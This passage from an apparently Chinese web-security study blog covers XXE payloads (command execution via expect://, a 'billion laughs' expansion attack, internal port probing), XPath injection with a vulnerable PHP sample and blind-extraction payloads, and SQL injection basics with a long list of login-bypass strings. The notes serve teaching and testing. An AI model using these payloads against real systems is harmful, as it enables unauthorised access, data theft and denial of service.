[<br>&lt;!ELEMENT name ANY &gt;<br>&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;<br>&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;<br></code></pre></td></tr></table></figure><h4 id="ddos"><a href="#ddos" class="headerlink" title="ddos"></a>ddos</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE lolz [&lt;!ENTITY lol &quot;lol&quot;&gt;<br>&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;<br>&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;<br>&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;<br>&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;<br>&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;<br>&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;<br>&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;<br>&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;<br>]&gt;<br>&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;<br></code></pre></td></tr></table></figure><h4 id="探测内网端口"><a href="#探测内网端口" class="headerlink" title="探测内网端口"></a>探测内网端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE xxe [<br>&lt;!ELEMENT name ANY &gt;<br>&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt;<br>]&gt;<br>&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;<br></code></pre></td></tr></table></figure><h2 id="xpath注入"><a href="#xpath注入" class="headerlink" title="xpath注入"></a>xpath注入</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>XPath 注入利用 XPath 解析器的松散输入和容错特性，能够在URL、表单或其它信息上附带恶意的XPath 查询代码，以获得高权限信息的访问权，类似于SQL注入。</p><p>注入对象是一个存储数据的XML文件。因为xpath不存在访问控制，所以不会遇到许多在SQL注入中经常遇到的访问限制。 注入出现的位置也就是<code>cookie</code>，<code>headers</code>，<code>request</code> ，<code>parameters/input</code>等</p><h3 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h3><p>test.xml(用于存储username和password)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span> <br>            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>test1<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>test1<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span> <br>        <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span> <br>            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>test2<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>test2<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$xml</span>=<span class="hljs-title function_ invoke__">simplexml_load_file</span>(<span class="hljs-string">&#x27;test.xml&#x27;</span>);<br><span class="hljs-variable">$name</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$pwd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>];<br><span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;/root/users/user[username/text()=&#x27;&quot;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&#x27; and password/text()=&#x27;&quot;</span>.<span class="hljs-variable">$pwd</span>.<span class="hljs-string">&quot;&#x27;]&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$query</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-variable">$xml</span>-&gt;<span class="hljs-title function_ invoke__">xpath</span>(<span class="hljs-variable">$query</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h2&gt;Welcome&lt;/h2&gt;&#x27;</span>;<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;ID:&#x27;</span>.<span class="hljs-variable">$value</span>-&gt;id;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;Username:&#x27;</span>.<span class="hljs-variable">$value</span>-&gt;username;<br>    &#125;<br>&#125;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>simplexml_load_file</code>，加载xml文件</p><p>正常查询：<code>?name=test1&amp;pwd=test1</code></p><p>server端语句：<code>/root/users/user[username/text()=&#39;test1&#39;and password/text()=&#39;test1&#39;]</code></p><p>注入语句：<code>?name=&#39; or 1=1 or &#39;&#39;=&#39;&amp;pwd=1</code></p><p>server语句：<code>/root/users/user[username/text()=&#39;&#39; or 1=1 or &#39;&#39;=&#39;&#39; and password/text()=&#39;1&#39;]</code></p><h3 id="注入payload"><a href="#注入payload" class="headerlink" title="注入payload"></a>注入payload</h3><h4 id="一般注入形式"><a href="#一般注入形式" class="headerlink" title="一般注入形式"></a>一般注入形式</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">//原php代码中的查询语句</span><br><span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;user/username[@name=&#x27;&quot;</span>.<span class="hljs-variable">$user</span>.<span class="hljs-string">&quot;&#x27;]&quot;</span>;<br><span class="hljs-comment">//构造payload1：user1&#x27; or 1=1 or &#x27;&#x27;=&#x27;</span><br><span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;user/username[@name=&#x27;user1&#x27; or 1=1 or &#x27;&#x27;=&#x27;&#x27;]&quot;</span>;<br><span class="hljs-comment">//构造payload2：&#x27;]|//*|//*[&#x27;</span><br><span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;user/username[@name=&#x27;user1&#x27;]|//*|//*[&#x27;&#x27;]&quot;</span>;<br></code></pre></td></tr></table></figure><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs PHP">链：/ -&gt; root -&gt; user/user -&gt; username/email/password<br>判断根节点下的节点数<br><span class="hljs-string">&#x27;or count(/)=1  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>     <span class="hljs-comment">//根节点数量为1</span><br><span class="hljs-string">&#x27;or count(/*)=1 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>     <span class="hljs-comment">//根节点下只有一个子节点</span><br>判断根节点下节点长度<br><span class="hljs-string">&#x27;or string-length(name(/*[1]))=1 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>      <span class="hljs-comment">//判断根节点下的节点长度为1</span><br>判断根节点下节点名称<br><span class="hljs-string">&#x27;or substring(name(/*[1]), 1, 1)=&#x27;</span>r<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>  <span class="hljs-comment">//猜根节点下的节点名称</span><br><span class="hljs-string">&#x27;or substring(name(/*[1]), 2, 1)=&#x27;</span>o<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>...<br>假设根节点下子节点名称为root，判断子节点下的的节点<br><span class="hljs-string">&#x27;or count(/root)=1  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>                  <span class="hljs-comment">//root节点数量为1</span><br><span class="hljs-string">&#x27;or count(/root/user/*)&gt;1 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>            <span class="hljs-comment">//root下有两个或以上节点</span><br><span class="hljs-string">&#x27;or string-length(name(/root/*[1]))=4  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>    <span class="hljs-comment">//判断第一个子节点长度为4</span><br>猜解root下的节点名称：<br><span class="hljs-string">&#x27;or substring(name(/root/*[1]), 1, 1)=&#x27;</span>u<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>    <span class="hljs-comment">//猜root节点下的第一个节点名称</span><br><span class="hljs-string">&#x27;or substring(name(/root/*[1]), 2, 1)=&#x27;</span>s<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>...<br>假设root下节点名称为user<br><span class="hljs-string">&#x27;or count(/root/user)=2  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>   <span class="hljs-comment">//user节点有两个，则可以猜测出root节点结构，root下两个节点，均为user节点</span><br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[1]), 1, 1)=&#x27;</span>u<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[1]), 2, 1)=&#x27;</span>s<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>...<br>判断user节点的子节点长度<br><span class="hljs-string">&#x27;or string-length(name(/root/user[position()=1]/*[1]))=8 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>  <span class="hljs-comment">//user下第一个子节点长名称度为8</span><br>判断user节点的下子节点名称<br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[1]), 1, 1)=&#x27;</span>u<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>  <span class="hljs-comment">//猜user节点下的第一个节点名称</span><br>...<br>最终所有子节点值验证如下：<br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[1]), 1)=&#x27;</span>username<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[2]), 1)=&#x27;</span>email<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring(name(/root/user[position()=1]/*[3]), 1)=&#x27;</span>password<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>猜有无子节点<br><span class="hljs-string">&#x27;or count(/root/user[position()=1]/username/*)&gt;0 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span>   <br><span class="hljs-string">&#x27;or count(/root/user[position()=1]/email/*)&gt;0 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span> <br><span class="hljs-string">&#x27;or count(/root/user[position()=1]/accounttype/*)&gt;0 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or count(/root/user[position()=1]/username/password/*)&gt;0 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-literal">false</span>则没有节点<br>读最后节点长度<br><span class="hljs-string">&#x27;or string-length((//user[position()=1]/username[position()=1]))=6 or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span> <span class="hljs-comment">//第一个user下username长度</span><br>读值<br><span class="hljs-string">&#x27;or substring((//user[position()=1]/username[position()=1]),1,1)=&#x27;</span>f<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring((//user[position()=1]/username[position()=1]),2,1)=&#x27;</span>l<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring((//user[position()=1]/username[position()=1]),3,1)=&#x27;</span>a<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or substring((//user[position()=1]/username[position()=1]),4,1)=&#x27;</span>g<span class="hljs-string">&#x27;  or &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>...<br></code></pre></td></tr></table></figure><p>更多参考</p><p><a href="https://jiang-niao.github.io/2020/04/24/%E4%BB%8Ectf%E9%A2%98%E7%9B%AE%E4%B8%AD%E5%AD%A6%E4%B9%A0xpath%E6%B3%A8%E5%85%A5/#CTF%E9%A2%98%E7%9B%AE">xpath盲注脚本</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>xml</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入</title>
    <link href="/2023/01/01/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/01/01/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="数据库知识"><a href="#数据库知识" class="headerlink" title="数据库知识"></a>数据库知识</h2><p>数据库结构：</p><p>mysql</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl">库-表-字段（数据）<br><span class="hljs-function"><span class="hljs-title">database</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">table</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">column</span>-&gt;</span>value<br></code></pre></td></tr></table></figure><p>常用sql语句：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">数据库创建</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">create database school;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询数据库</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">show databases;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">创建表</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">create table student(<span class="hljs-built_in">id</span> int(10),username varchar(20),mail varchar(20));</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询表</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">show tables;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">插入数据</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">insert into student(<span class="hljs-built_in">id</span>,username,mail) values(1,<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-string">&quot;zs@redteam.com&quot;</span>);</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">insert into student(<span class="hljs-built_in">id</span>,username,mail) values(2,<span class="hljs-string">&quot;lisi&quot;</span>,<span class="hljs-string">&quot;ls@redteam.com&quot;</span>);</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询数据</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> mail from student;</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> * from student;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">修改数据</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">update student <span class="hljs-built_in">set</span> username=<span class="hljs-string">&quot;zhangsan2&quot;</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = 1 ;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除数据</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">delete from student <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = 1;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除表</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">drop table student;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除数据库</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">drop database school;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询登录的用户</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> user();</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询数据存放地址</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> @@datadir;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询数据库的版本</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> version();</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">where</span>条件,<span class="hljs-built_in">limit</span>条件</span><br>where 字段名=x 返回对应字段名为x的那一行<br>limit x,x 查询的数据 只返回第(x-1)行开始的内容 返回x行<br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-built_in">limit</span> 0,1;</span><br></code></pre></td></tr></table></figure><p>PHP连接数据库语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$host</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$user</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$pass</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$user</span>,<span class="hljs-variable">$pass</span>);  <span class="hljs-comment">//打开非持久的 MySQL 连接</span><br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&quot;school&quot;</span>);   <span class="hljs-comment">//选择school数据库</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from student&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);  <span class="hljs-comment">//执行sql语句</span><br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>))&#123;  <span class="hljs-comment">//取一行结果为数组（有keyvalue），没有行返回false</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;id:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;id&quot;</span>].<span class="hljs-string">&quot; username:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;username&quot;</span>].<span class="hljs-string">&quot; mail:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;mail&quot;</span>].<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="sql注入-1"><a href="#sql注入-1" class="headerlink" title="sql注入"></a>sql注入</h2><p>原理</p><p>闭合符号如<code>&#39;</code>、<code>&quot;</code>、<code>&#39;)</code>，达到执行其他语句的效果</p><p>万能密码</p><p>sql语句：</p><p><code>SELECT * FROM users WHERE username= &#39;&quot;.$username.&quot;&#39; AND Password= &#39;&quot;.md5($password).&quot;&#39;</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-string">&#x27; or 1=&#x27;</span>1<br><span class="hljs-string">&#x27;or&#x27;</span>=<span class="hljs-string">&#x27;or&#x27;</span><br><span class="hljs-string">&quot;or &quot;</span>a<span class="hljs-string">&quot;=&quot;</span>a<br>a<span class="hljs-string">&#x27; having 1=1#</span><br><span class="hljs-string">a&#x27;</span> having <span class="hljs-attribute">1</span>=1--<br>admin<span class="hljs-string">&#x27;--</span><br><span class="hljs-string">admin&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1--<br>admin<span class="hljs-string">&#x27; or 1=1#</span><br><span class="hljs-string">admin&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span>--<br>admin<span class="hljs-string">&#x27; or &#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br>admin<span class="hljs-string">&#x27; OR 4=4/*</span><br><span class="hljs-string">&#x27;</span>)<span class="hljs-keyword">or</span>(<span class="hljs-string">&#x27;a&#x27;</span>=<span class="hljs-string">&#x27;a</span><br><span class="hljs-string">or 4=4--</span><br><span class="hljs-string">&quot;or 4=4--</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span> <span class="hljs-attribute">4</span>=4/*<br><span class="hljs-string">&#x27;or&#x27;</span>a<span class="hljs-string">&#x27;=&#x27;</span>a<br><span class="hljs-string">&quot;or&quot;</span>=<span class="hljs-string">&quot;a&#x27;=&#x27;a</span><br><span class="hljs-string">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="hljs-string">&#x27; OR &#x27;1&#x27;=&#x27;1</span><br><span class="hljs-string">&#x27;OR 4=4%00</span><br><span class="hljs-string">&quot;</span><span class="hljs-keyword">or</span> <span class="hljs-attribute">4</span>=4%00<br>1<span class="hljs-string">&#x27;or&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br>1 <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span>=1<br>1 <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-attribute">4</span>=4<br>admin<span class="hljs-string">&#x27; UNION Select 1,1,1 FROM admin Where &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>-1%cf<span class="hljs-string">&#x27; union select 1,1,1 as password,1,1,1 %23</span><br></code></pre></td></tr></table></figure><h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p>union的使用：sql语句1 union sql语句2 如果字段数相同的话会同时返回，且sql语句1出错时只返回sql语句2</p><p>注入流程：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs gauss">判断注入点：<br><span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-built_in">union</span><br><span class="hljs-number">1</span>&#x27; <span 